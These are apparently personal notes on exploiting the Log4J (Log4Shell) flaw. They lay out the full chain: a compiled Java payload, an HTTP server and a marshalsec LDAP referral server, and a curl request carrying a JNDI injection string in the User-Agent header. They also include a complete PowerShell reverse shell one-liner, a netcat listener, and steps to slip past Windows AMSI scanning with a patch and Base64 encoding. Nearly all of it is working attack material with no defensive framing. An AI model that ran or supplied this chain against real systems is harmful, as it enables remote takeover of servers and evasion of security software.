# Log4J Vulnerability

## Sources

* [John Hammond Log4J Video](https://www.youtube.com/watch?v=7qoPDq41xhQ&t=1481s)
* [Initial Github Repository For Log4J POC](https://github.com/xiajun325/apache-log4j-rce-poc)
* [Github - Powershell Reverse Shell](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3)

## Method

Compile `Log4J.java` file :
```
javac Log4J.java
```

Start a HTTP server with Python :
```
python3 -m http.server 8080
```

Start LDAP server :
```
git clone git@github.com:mbechler/marshalsec.git
cd marshalsec
mvn clean package -DskipTests
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8080/#Log4J"
```

Send poisonned request to server :
```
curl -H 'User-Agent: ${jndi:ldap://127.0.0.1:1389/Log4J}' localhost:8080
```

## Reverse shell

Create `netcat` connection to receive the access to the reverse shell :
```
nc -lnvp 8080
```

Get the following Powershell script then edit the IP address and the port to match with the target.
```
$client = New-Object System.Net.Sockets.TCPClient("127.0.0.1",8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Go on [AMSI.fail](https://amsi.fail/) wbesite and copy a `Rasta-mouses Amsi-Scan-Buffer patch`.  
Encode into Base64 the script thanks to a [Powershell Encoder](https://raikia.com/tool-powershell-encoder/) by pasting the `Rasta-mouses Amsi-Scan-Buffer patch` and the Powershell script.

Adapt the code in `Log4J.java` file to run the corresponding command then compile :
```
javac Log4J.java
```